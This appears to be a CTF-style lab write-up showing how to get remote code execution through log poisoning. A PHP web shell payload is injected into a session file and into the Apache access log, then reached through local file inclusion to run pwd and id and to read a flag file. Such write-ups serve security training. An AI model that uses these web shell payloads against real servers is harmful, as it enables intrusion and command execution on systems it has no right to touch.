# Log Poisoning

#### Use any of the techniques covered in this section to gain RCE, then submit the output of the following command: pwd

**Step 1** - Get your cookie session:

* Open Inspect Element and copy the cookie value:

<figure><img src="../../../.gitbook/assets/image (280).png" alt=""><figcaption></figcaption></figure>

* Place on the URL with the following format:
  * ```
    /var/lib/php/sessions/sess_u40q7cfju99gqggpo1is17d91d
    ```

<figure><img src="../../../.gitbook/assets/image (281).png" alt=""><figcaption></figcaption></figure>

* The cookie values are successfully read

**Step 2** - Write a web shell:

* URL encode `<?php system($GET["cmd"]);?>` and place in the URL to write a web shell:
  * ```bash
    %3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
    ```

<figure><img src="../../../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>

**Step 3** - Get the pwd info:

* Use the web shell with the `pwd` command:
  * ```
    /var/lib/php/sessions/sess_YOUR_COOKIE&cmd=pwd
    ```

<figure><img src="../../../.gitbook/assets/image (284).png" alt=""><figcaption></figcaption></figure>



#### Try to use a different technique to gain RCE and read the flag at /

**Step 1** - Try to read the access.log file:

* Place `/var/log/apache2/access.log` on the URL

<figure><img src="../../../.gitbook/assets/image (294).png" alt=""><figcaption></figcaption></figure>

* Intercept it with Burp Suite
* Change the User Agent to a string, to see if its reflected on the log file

<figure><img src="../../../.gitbook/assets/image (295).png" alt=""><figcaption></figcaption></figure>

* Change the User-Agent to `<?php system($_GET['cmd']); ?>`  (use single quotes) and append the `cmd=id`&#x20;

<figure><img src="../../../.gitbook/assets/image (296).png" alt=""><figcaption></figcaption></figure>

**Step 2** - Get the flag:

* Look for the flag with `cat%20../../../c85ee5082f4c723ace6c0796e3a3db09.txt`

<figure><img src="../../../.gitbook/assets/image (297).png" alt=""><figcaption></figcaption></figure>

And flag found!
